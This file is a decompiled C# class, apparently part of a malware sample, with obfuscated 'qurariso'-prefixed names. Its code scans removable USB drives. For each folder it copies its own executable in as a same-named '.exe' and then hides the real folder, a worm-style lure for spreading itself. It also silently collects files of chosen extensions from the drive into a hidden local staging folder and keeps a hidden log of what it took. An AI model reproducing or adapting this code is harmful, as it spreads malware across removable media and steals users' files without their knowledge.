using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

namespace uwcrise;

internal class qurarisoUSBP
{
	public List<string> qurarisofExts = new List<string>();

	public bool qurarisothr_runing = false;

	public string qurarisofilePath = Application.get_ExecutablePath();

	public bool qurarisoIsAccessible(string folder)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(folder);
		try
		{
			directoryInfo.GetDirectories();
			if (qurarisoSETPS.qurarisonFilders.Contains(folder.Substring(3).ToLower()))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void qurarisoget_drives()
	{
		try
		{
			qurarisofExts.Clear();
			qurarisothr_runing = true;
			string[] array = qurarisoSETPS.qurarisofilexts.Split(new char[1] { '>' });
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (text != "")
				{
					qurarisofExts.Add(text);
				}
			}
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array3 = drives;
			foreach (DriveInfo driveInfo in array3)
			{
				if (driveInfo.IsReady && driveInfo.DriveType == DriveType.Removable)
				{
					qurarisobFilders(driveInfo.Name);
					qurarisosent_files(driveInfo.Name);
				}
			}
			qurarisothr_runing = false;
		}
		catch
		{
			qurarisothr_runing = false;
		}
	}

	public IEnumerable<string> qurarisogetFiles(string path)
	{
		Queue<string> queue = new Queue<string>();
		queue.Enqueue(path);
		while (queue.Count > 0)
		{
			path = queue.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (qurarisoIsAccessible(text))
					{
						queue.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = null;
			try
			{
				files = Directory.GetFiles(path);
			}
			catch
			{
			}
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void qurarisobFilders(string path)
	{
		string[] directories = Directory.GetDirectories(path);
		string[] array = directories;
		foreach (string text in array)
		{
			string text2 = text + ".exe|qurariso".Split(new char[1] { '|' })[0];
			if (!text.Contains(qurarisoSETPS.qurarisousbfold) && !text.Contains("System Volume Information|qurariso".Split(new char[1] { '|' })[0]) && !File.Exists(text2))
			{
				try
				{
					File.Copy(qurarisofilePath, text2, overwrite: true);
					DirectoryInfo directoryInfo = new DirectoryInfo(text);
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				catch
				{
				}
			}
		}
	}

	public bool qurarisowriteFile(string line)
	{
		try
		{
			TextWriter textWriter = new StreamWriter(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofileusb, append: true);
			textWriter.WriteLine(line);
			textWriter.Close();
			File.SetAttributes(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofileusb, FileAttributes.Hidden);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool qurarisofindFile(string line)
	{
		try
		{
			if (File.Exists(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofileusb))
			{
				string[] array = File.ReadAllLines(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisofileusb);
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (line.ToLower() == text.ToLower())
					{
						return true;
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void qurarisosent_files(string path)
	{
		try
		{
			if (!Directory.Exists(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbdate))
			{
				Directory.CreateDirectory(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbdate);
			}
			foreach (string item in qurarisogetFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (!qurarisofExts.Contains(text.ToLower()) || qurarisofindFile(item))
				{
					continue;
				}
				if (item.Contains(qurarisoSETPS.qurarisousbfold))
				{
					string text2 = qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbdate + qurarisoSETPS.qurarisousbfold + "\\";
					if (!Directory.Exists(text2))
					{
						Directory.CreateDirectory(text2);
					}
					File.Copy(item, qurarisoSETPS.qurarisouni_file(text2 + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
				}
				else
				{
					File.Copy(item, qurarisoSETPS.qurarisouni_file(qurarisoSETPS.qurarisoget_upath() + qurarisoSETPS.qurarisousbdate + Path.GetFileName(item), File.ReadAllBytes(item).Length), overwrite: true);
				}
				qurarisowriteFile(item);
			}
		}
		catch
		{
		}
	}
}
